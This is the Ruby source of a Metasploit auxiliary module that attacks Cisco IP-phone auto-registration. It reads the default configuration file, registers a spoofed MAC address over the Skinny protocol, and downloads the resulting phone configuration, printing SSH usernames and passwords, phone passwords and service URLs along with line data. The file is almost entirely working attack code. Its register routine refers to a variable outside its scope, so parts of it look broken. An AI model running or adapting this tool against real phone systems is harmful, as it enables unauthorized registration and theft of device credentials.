##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Skinny

  def initialize(info = {})
    super(
      'Name'        => 'Viproy Cisco Auto Registration Analyser',
      'Version'     => '1',
      'Description' => 'Viproy Cisco auto registration analyser',
      'Author'      => 'fozavci',
      'License'     => 'GPL'
    )

    register_options(
      [
          Opt::RPORT(6970),
      ], self.class)

    register_advanced_options(
      [
          OptString.new('MAC', [ true, 'MAC Address of target phone', '000C29E58CA3']),
          OptString.new('PROTO_TYPE',   [ false, "Device Type (e.g. SIP,SEP)", "SEP"]),
          OptString.new('CISCOCLIENT',   [ true, "Cisco software type (ipphone,cipc)","cipc"]),
      ], self.class)
  end

  def run
    mac = Rex::Text.uri_encode(datastore["MAC"])
    client=datastore['CISCOCLIENT'].downcase

    vprint_status("Getting registration configuration.")

    res = send_request_cgi(
        {
            'uri'     => "/XMLDefault.cnf.xml",
            'method'  => 'GET',
            'agent'   => 'CIPC',
        }, 20)

    if (res and res.code == 200 and res.body =~ /autoRegistration/)
      doc = Nokogiri::XML(res.body)
      print_good("Auto registration is #{doc.at('autoRegistration').inner_text}")
      doc.search('//callManager').each do |t|
      print_status("Server name is #{t.at('name').inner_text}")
      end

      doc.search('//ports').each do |t|
      result = "\tSkinny port \t\t: #{doc.at('ethernetPhonePort').inner_text}\n"
      result << "\tSIP port \t\t: #{doc.at('sipPort').inner_text}\n"
      result << "\tSIP TLS port \t\t: #{doc.at('securedSipPort').inner_text}\n"
      vprint_status("IP phone services:\n #{result}")
      end

      # wait for the registration
      Rex.sleep(1)

      if datastore['PROTO_TYPE'] == "SEP"
        # registering mac address through skinny service
        register(mac,doc.at('ethernetPhonePort').inner_text)


        # wait for the registration
        Rex.sleep(1)

        # obtaining a sample configuration file for the registration
        vprint_status("Getting a sample IP phone configuration.")

        res = send_request_cgi(
            {
                'uri'     => "/SEP#{mac}.cnf.xml",
                'method'  => 'GET',
                'agent'   => 'CIPC',
            }, 20)

        printconf(res)
      else
        print_error("SIP auto registration is not ready.")
      end

    else
      print_error("Server response code is #{res.code}") if res
      print_error("Server response is invalid.")
    end

  end

  def printconf(res)
    if (res and res.code == 200 and res.body =~ /fullConfig/)
      doc = Nokogiri::XML(res.body)
      result = "\tProtocol \t\t: #{doc.at('deviceProtocol').inner_text}\n"
      result << "\tSSH user \t\t: #{doc.at('sshUserId').inner_text}\n"
      result << "\tSSH password \t\t: #{doc.at('sshPassword').inner_text}\n"
      result << "\tPhone password \t\t: #{doc.at('phonePassword').inner_text}\n"
      result << "\tAuthentication \t\t: #{doc.at('authenticationURL').inner_text}\n"
      result << "\tDirectory \t\t: #{doc.at('directoryURL').inner_text}\n"
      result << "\tInformation \t\t: #{doc.at('informationURL').inner_text}\n"
      result << "\tMessage \t\t: #{doc.at('messagesURL').inner_text}\n"
      result << "\tService \t\t: #{doc.at('servicesURL').inner_text}\n"
      result << "\tSecure authentication \t: #{doc.at('secureAuthenticationURL').inner_text}\n"
      result << "\tSecure directory \t: #{doc.at('secureDirectoryURL').inner_text}\n"
      result << "\tSecure idle \t\t: #{doc.at('secureIdleURL').inner_text}\n"
      result << "\tSecure information \t: #{doc.at('secureInformationURL').inner_text}\n"
      result << "\tSecure services \t: #{doc.at('secureServicesURL').inner_text}\n"

      print_good("Sample phone configuration:\n #{result}")
    else
      vprint_status("Server response code is #{res.code}") if res
      print_error("Sample configuration couldn't be parsed.")
    end
  end

  def register(mac,rport)
    rhost=datastore["RHOST"]
    device="#{datastore['PROTO_TYPE']}#{mac.gsub(":","")}"
    device_ip=Rex::Socket.source_address(rhost)

    begin
      sock = Rex::Socket::Tcp.create(
          'PeerHost'   => rhost,
          'PeerPort'   => rport.to_i,
      )

      #Register
      sock.put(prep_register(device,device_ip,client))
      print_status("Register request sent for #{device}")

      #Obtain configuration data
      sock.put(prep_configstatreq)
      print_status("Configuration request sent for #{device}")

      #Retrieving the response from the socket
      r,m,l=getresponse

      #Retrieving the response from the socket
      while r != "ConfigStatMessage"
        r,m,l=getresponse
        case r
          when "error"
            print_error("#{mac} MAC address is not registered on #{rhost}")
            return nil
          when "RegisterAckMessage"
            print_good("#{mac} MAC address is registered on #{rhost}")
            return nil
          when "RegisterRejectMessage"
            print_error("#{mac} MAC address is not registered on #{rhost}")
            return nil
        end
      end

      print_good("The following is the configuration for #{mac}")
      m.split("\t").each do |l|
        print_good("  #{l}")
      end

      if ! l.nil?
        l.times do |i|
          #Obtain line data
          sock.put(prep_linestatreq(i+1))
          vprint_status("Line request sent for #{i+1}")

          #Retrieving the response from the socket
          while r != "LineStatMessage"
            r,m,l=getresponse
            case r
              when "error"
                print_error("The line information retrieve error.")
                return nil
              when "LineStatMessage"
                print_good("The line #{i+1} information:")
                m.split("\t").each do |l|
                  print_good("  #{l}")
                end
            end
          end
          r = nil
        end
      end

      sock.disconnect
    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.class}: #{e}")
      return nil
    end
  end

end
